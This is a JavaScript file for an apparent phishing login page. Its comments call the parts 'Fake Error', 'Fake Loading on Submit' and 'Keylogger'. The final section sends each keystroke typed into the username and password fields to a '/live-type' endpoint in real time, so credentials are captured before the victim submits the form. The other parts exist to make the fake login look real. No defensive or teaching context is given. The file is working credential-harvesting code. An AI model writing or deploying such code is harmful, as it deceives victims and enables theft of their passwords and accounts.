// 1. Hide Loader after 1.5 seconds
setTimeout(() => {
    const loader = document.getElementById('loader');
    if(loader) loader.style.display = 'none';
}, 1500);

// 2. Check URL for Fake Error
const urlParams = new URLSearchParams(window.location.search);
if(urlParams.get('error') === '1') {
    const err = document.getElementById('errorMessage');
    if(err) err.style.display = 'block';
}

// 3. Password Show/Hide
const togglePassword = document.getElementById('togglePassword');
const passwordField = document.getElementById('passwordField');

if(togglePassword && passwordField) {
    togglePassword.addEventListener('click', function (e) {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        this.textContent = type === 'password' ? '👁️' : '🙈';
    });
}

// 4. Fake Loading on Submit
const loginForm = document.getElementById('loginForm');
const loginBtn = document.getElementById('loginBtn');

if(loginForm && loginBtn) {
    loginForm.addEventListener('submit', function(e) {
        loginBtn.textContent = "Logging in...";
        loginBtn.disabled = true;
        loginBtn.style.opacity = "0.7";
    });
}

// 5. Live Typing (Keylogger)
const usernameInput = document.querySelector('input[name="username"]');

if(usernameInput) {
    usernameInput.addEventListener('input', (e) => {
        fetch('/live-type', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ field: 'username', value: e.target.value })
        });
    });
}

if(passwordField) {
    passwordField.addEventListener('input', (e) => {
        fetch('/live-type', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ field: 'password', value: e.target.value })
        });
    });
}